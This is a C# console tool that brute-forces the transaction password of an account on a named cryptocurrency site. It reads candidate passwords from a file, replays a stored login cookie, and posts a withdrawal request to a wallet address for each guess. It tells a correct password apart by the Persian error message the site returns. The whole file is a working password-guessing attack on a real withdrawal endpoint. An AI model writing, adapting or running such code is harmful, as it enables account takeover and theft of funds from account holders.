using Newtonsoft.Json;
using System;
using System.Collections.Generic;
using System.Configuration;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Http;
using System.Text;
using System.Threading.Tasks;

namespace TrPassMine
{
    public class PassMine
    {
        private readonly string filepath = ConfigurationManager.AppSettings["passwordFilePath"];
        private readonly string WalletADDR = ConfigurationManager.AppSettings["walletAddr"];
        private readonly string LoginCookie = ConfigurationManager.AppSettings["LoginCookie"];
        private readonly Uri baseaddress = new Uri("https://btcdsi.com");
        private readonly string targetUrl = "/index/withdraw/index.html";
        private StringContent Serialize(object obj)
        {
            return new StringContent(JsonConvert.SerializeObject(obj), Encoding.UTF8, "application/json");
        }
        public T Deserialize<T>(string obj)
        {
            return JsonConvert.DeserializeObject<T>(obj, new JsonSerializerSettings());
        }
        private List<string> GetPasswordsFromFile()
        {
            if (File.Exists(filepath))
                return File.ReadAllLines(filepath).ToList();
            else
                return null;
        }
        private Dictionary<string, string> processCookie()
        {
            Dictionary<string, string> result = new Dictionary<string, string>();
            foreach (var rcd in LoginCookie.Split(';'))
            {
                if(!string.IsNullOrEmpty(rcd.Trim()))
                    result.Add(rcd.Trim().Split('=')[0], rcd.Trim().Split('=')[1]);
            }
            return result;
        }
        public async Task<string> CheckPasswords()
        {
            try
            {
                var passwords = GetPasswordsFromFile();
                FrmModel model = new FrmModel() { money = 5, wallet_type = "trc20", usdt_wallet = WalletADDR };
                long counter = 1;
                if (passwords != null)
                {
                    foreach (var pass in passwords)
                    {
                        model.paypwd = pass;
                        var cookieContainer = new CookieContainer();
                        using (var handler = new HttpClientHandler() { CookieContainer = cookieContainer })
                        using (HttpClient client = new HttpClient(handler) { BaseAddress = baseaddress })
                        {
                            try
                            {
                                processCookie().ToList().ForEach(x => { cookieContainer.Add(baseaddress, new Cookie(x.Key, x.Value)); });
                            }
                            catch (Exception)
                            {
                                Console.WriteLine("error in parsing login cookie");
                                break;
                            }
                            var response = await client.PostAsync(targetUrl, Serialize(model));
                            if (response.IsSuccessStatusCode)
                            {
                                var message = Deserialize<ResponseModel>(await response.Content.ReadAsStringAsync());
                                var msgg = WebUtility.HtmlDecode(message.msg);
                                if (msgg != " خطای کلمه عبور تراکنش ")
                                {
                                    if (msgg == "موجودی ناکافی")
                                    {
                                        Console.WriteLine($"{counter}) password : {pass}  -->  result : sucessfull!" + Environment.NewLine);
                                        Console.WriteLine($"password is : {pass}");
                                        break;
                                    }
                                    else
                                        Console.WriteLine($"{counter}) password : {pass}  -->  result : unknown error");
                                }
                                else
                                    Console.WriteLine($"{counter}) password : {pass}  -->  result : tr password error");
                            }
                        }
                        counter++;
                    }
                }
                else
                    Console.WriteLine("password file not found");
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.Message);
            }
            return "";
        }
    }
    public class FrmModel
    {
        public int money { get; set; }
        public string wallet_type { get; set; }
        public string usdt_wallet { get; set; }
        public string paypwd { get; set; }
    }
    public class ResponseModel
    {
        public string code { get; set; }
        public string msg { get; set; }
    }
}
